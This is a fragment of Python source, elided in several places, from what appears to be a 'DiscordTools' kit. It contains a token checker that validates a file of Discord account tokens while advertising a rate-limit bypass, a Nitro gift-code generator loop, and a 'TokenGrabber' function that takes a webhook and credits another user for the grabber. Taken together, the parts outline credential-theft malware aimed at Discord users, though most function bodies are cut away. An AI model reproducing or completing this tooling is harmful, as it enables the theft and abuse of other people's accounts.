import requests, random, ctypes, string, aiohttp, json, asyncio, socket, sys, discord, os, unidecode, numpy
    ...
    with open(filename,'r',encoding='utf8') as f:
        for line in f:
            ...
            if r.status_code == 400:
                Valid += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"Discord X T-Checker | RateLimit Bypass | Github.com/XinGodDev | Valid Tokens :{Valid} | Invalid Tokens :{Invalid} / Error :{error}")
                print(f"{Fore.GREEN}{token}")
            elif r.status_code == 401:
                Invalid += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f"DiscordTools Token Checker | RateLimit Bypass | Github.com/XinGodDev | Valid Tokens :{Valid} | Invalid Tokens :{Invalid} / Error :{error}")
...
def GenerateNitro(filename,amount):
    ...
    while count <= amount:
        ...
        count += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"DiscordTools Nitro Generator | Github.com/XinGodDev | ")
...
def TokenGrabber(WEBHOOK):
    ...
    def getdeveloper():
        try:
            dev = "@WannaBeSkid Thanks him for grabber * DiscordTools"
            return dev
        except:
